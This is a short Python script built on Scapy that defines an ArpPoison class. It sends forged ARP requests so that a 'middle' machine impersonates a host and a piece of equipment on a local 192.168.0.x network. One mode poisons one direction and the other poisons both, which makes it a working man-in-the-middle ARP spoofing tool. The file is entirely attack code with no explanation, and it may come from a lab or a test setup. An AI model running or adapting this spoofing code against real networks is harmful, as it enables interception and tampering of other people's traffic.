from scapy.all import *

class ArpPoison:
    def __init__(self, mode = 0):
        super().__init__()
        self.mode = mode
        self.MAC_BROADCAST = "FF:FF:FF:FF:FF:FF"
        self.MAC_HOST = "00:0C:29:06:28:E5"
        self.IP_HOST = "192.168.0.10"

        self.MAC_EQUIPMENT = "00:0C:29:E9:42:B4"
        self.IP_EQUIPMENT = "192.168.0.11"

        self.MAC_MIDDLE = "00:0E:C6:78:0E:A0"
        self.IP_MIDDLE = "192.168.0.9"

    def send(self):
        if self.mode == 0:
            ether = Ether()
            arp = ARP()

            ether.dst = self.MAC_BROADCAST
            ether.src = self.MAC_MIDDLE
            arp.hwsrc = self.MAC_MIDDLE
            arp.psrc = self.IP_HOST
            arp.pdst = self.IP_EQUIPMENT
            arp.op = 1

            pkt = ether/arp
            sendp(pkt, iface="以太网 2", verbose=0)

        elif self.mode == 1:
            ether = Ether()
            arp = ARP()

            ether.dst = self.MAC_BROADCAST
            ether.src = self.MAC_MIDDLE

            arp.hwsrc = self.MAC_MIDDLE
            arp.psrc = self.IP_HOST
            arp.pdst = self.IP_EQUIPMENT
            arp.op = 1
            pkt = ether/arp
            sendp(pkt, iface="以太网 2", verbose=0)
            
            arp.psrc = self.IP_EQUIPMENT
            arp.pdst = self.IP_HOST
            pkt = ether/arp
            sendp(pkt, iface="以太网 2", verbose=0)

        
        